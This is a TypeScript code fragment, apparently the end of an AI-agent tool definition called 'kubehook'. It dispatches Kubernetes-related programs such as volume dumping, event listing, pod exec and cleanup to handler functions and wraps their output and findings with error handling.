      k8s_pv_dump: () => k8sPvDump(params.args, params.timeout_seconds),
      k8s_events: () => k8sEvents(params.args, params.timeout_seconds),
      k8s_exec: () => k8sExec(params.args, params.timeout_seconds),
      cleanup_k8s: () => cleanupK8s(params.args, params.timeout_seconds),
    }

    try {
      const result = await dispatch[params.program]()
      return {
        title: `kubehook: ${params.program}`,
        output: result.output,
        metadata: { program: params.program, findings: result.findings },
      }
    } catch (e) {
      return {
        title: `kubehook: ${params.program}`,
        output: `Error: ${e instanceof Error ? e.message : String(e)}`,
        metadata: { program: params.program, findings: [] },
      }
    }
  },
})
